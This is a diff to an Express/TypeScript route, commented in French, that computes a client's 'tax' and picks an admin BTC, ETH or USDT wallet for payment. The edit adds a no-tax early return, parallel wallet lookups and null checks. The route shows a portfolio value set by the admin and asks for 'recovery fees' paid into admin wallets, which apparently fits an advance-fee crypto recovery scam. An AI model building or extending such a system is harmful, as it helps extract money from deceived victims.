@@ -1725,10 +1725,31 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(404).json({ error: 'Client non trouvé' });
       }
 
-      // Récupérer les wallets admin configurés
-      const btcWallet = await storage.getSetting('admin_btc_wallet');
-      const ethWallet = await storage.getSetting('admin_eth_wallet');
-      const usdtWallet = await storage.getSetting('admin_usdt_wallet');
+      // Vérifier si le client a une taxe configurée
+      if (!client.taxPercentage || parseFloat(client.taxPercentage) === 0) {
+        return res.json({
+          taxPercentage: '0',
+          taxAmount: '0.00',
+          taxCurrency: 'BTC',
+          taxStatus: 'none',
+          taxWalletAddress: '',
+          taxReason: 'Aucune taxe configurée',
+          transactionHash: '',
+          portfolioValue: (client.amount || 0).toFixed(2),
+          adminWallets: {
+            btc: '',
+            eth: '',
+            usdt: ''
+          }
+        });
+      }
+
+      // Récupérer les wallets admin configurés en parallèle
+      const [btcWallet, ethWallet, usdtWallet] = await Promise.all([
+        storage.getSetting('admin_btc_wallet').catch(() => null),
+        storage.getSetting('admin_eth_wallet').catch(() => null),
+        storage.getSetting('admin_usdt_wallet').catch(() => null)
+      ]);
 
       // Utiliser le montant configuré par l'admin
       const portfolioValue = client.amount || 0;
@@ -1738,11 +1759,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       // Utiliser le wallet admin correspondant selon la devise de taxe
       let walletAddress = '';
-      if (taxCurrency === 'BTC' && btcWallet) {
+      if (taxCurrency === 'BTC' && btcWallet?.value) {
         walletAddress = btcWallet.value;
-      } else if (taxCurrency === 'ETH' && ethWallet) {
+      } else if (taxCurrency === 'ETH' && ethWallet?.value) {
         walletAddress = ethWallet.value;
-      } else if (taxCurrency === 'USDT' && usdtWallet) {
+      } else if (taxCurrency === 'USDT' && usdtWallet?.value) {
         walletAddress = usdtWallet.value;
       } else {
         // Fallback vers le wallet du client s'il existe
@@ -1756,7 +1777,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         taxStatus: client.taxStatus || 'unpaid',
         taxWalletAddress: walletAddress,
         taxReason: 'Frais de récupération et traitement administratif',
-        transactionHash: client.taxPaymentProof,
+        transactionHash: client.taxPaymentProof || '',
         portfolioValue: portfolioValue.toFixed(2),
         adminWallets: {
           btc: btcWallet?.value || '',
